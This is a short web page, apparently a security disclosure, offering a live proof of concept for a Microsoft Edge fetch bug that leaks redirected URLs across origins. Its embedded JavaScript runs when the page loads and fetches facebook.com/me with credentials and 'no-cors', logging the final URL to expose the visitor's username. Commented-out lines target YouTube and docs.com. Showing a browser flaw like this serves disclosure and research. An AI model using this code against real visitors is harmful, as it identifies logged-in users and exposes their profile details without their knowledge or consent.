---
layout: default
title: Microsoft Edge Fetch Proof of Concept
---

# Microsoft Edge Fetch Proof of Concept

For the PoC to work, you must be browsing with a vulnerable Microsoft Edge version while logged in to the listed services.

<div class="language-klipse-eval-js" data-async-code="true">
function test_fetch(url)
{
    fetch(url, {
            mode: "no-cors",
            credentials: "include",
         }).then(function(response) {
                if (!response.url) {
                    console.log("Fetch does not leak URL");
                }
                else
                {
                    console.log(url + ": " + response.url);
                }
            }).catch(function(error) {
                console.log("Failed with: ", error);
            });
}

//test_fetch("https://youtube.com/profile");
//test_fetch("https://docs.com/me");

test_fetch("https://facebook.com/me");
</div>

If the code above prints your username, an attacker could identify you by reading the username from the URL. All your public information on this page will be available to the attacker (for instance all your public Facebook details that can be found by browsing to the above URL).